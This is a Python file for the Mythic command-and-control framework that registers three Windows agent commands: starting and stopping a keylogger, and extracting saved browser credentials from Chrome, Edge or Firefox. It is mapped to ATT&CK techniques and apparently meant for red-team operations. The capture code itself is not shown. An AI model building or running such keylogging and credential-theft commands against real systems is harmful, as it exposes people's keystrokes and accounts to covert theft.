from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json


class KeyloggerStartArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class KeyloggerStartCommand(CommandBase):
    cmd = "keylogger_start"
    needs_admin = False
    help_cmd = "keylogger_start"
    description = "Start a keylogger in a background thread."
    version = 1
    author = "b4r0n"
    argument_class = KeyloggerStartArguments
    attackmapping = ["T1056.001"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp


class KeyloggerStopArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class KeyloggerStopCommand(CommandBase):
    cmd = "keylogger_stop"
    needs_admin = False
    help_cmd = "keylogger_stop"
    description = "Stop the running keylogger and retrieve captured keystrokes."
    version = 1
    author = "b4r0n"
    argument_class = KeyloggerStopArguments
    attackmapping = ["T1056.001"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        return PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp


class BrowserCredsArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="browser",
                cli_name="browser",
                display_name="Browser",
                type=ParameterType.ChooseOne,
                choices=["chrome", "edge", "firefox", "all"],
                default_value="all",
                description="Browser to extract credentials from.",
                parameter_group_info=[ParameterGroupInfo(required=False, ui_position=1)],
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) == 0:
            self.add_arg("browser", "all")
        elif self.command_line[0] == "{":
            self.load_args_from_json_string(self.command_line)
        else:
            self.add_arg("browser", self.command_line.strip())


class BrowserCredsCommand(CommandBase):
    cmd = "browser_creds"
    needs_admin = False
    help_cmd = "browser_creds [browser]"
    description = "Extract saved credentials from web browsers."
    version = 1
    author = "b4r0n"
    argument_class = BrowserCredsArguments
    attackmapping = ["T1555.003"]
    attributes = CommandAttributes(
        supported_os=[SupportedOS.Windows],
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        resp = PTTaskCreateTaskingMessageResponse(TaskID=taskData.Task.ID, Success=True)
        browser = taskData.args.get_arg("browser")
        resp.DisplayParams = f"-browser {browser}"
        return resp

    async def process_response(
        self, task: PTTaskMessageAllData, response: any
    ) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        if response:
            await SendMythicRPCResponseCreate(
                MythicRPCResponseCreateMessage(
                    TaskID=task.Task.ID,
                    Response=(response if isinstance(response, str) else json.dumps(response)).encode(),
                )
            )
        return resp
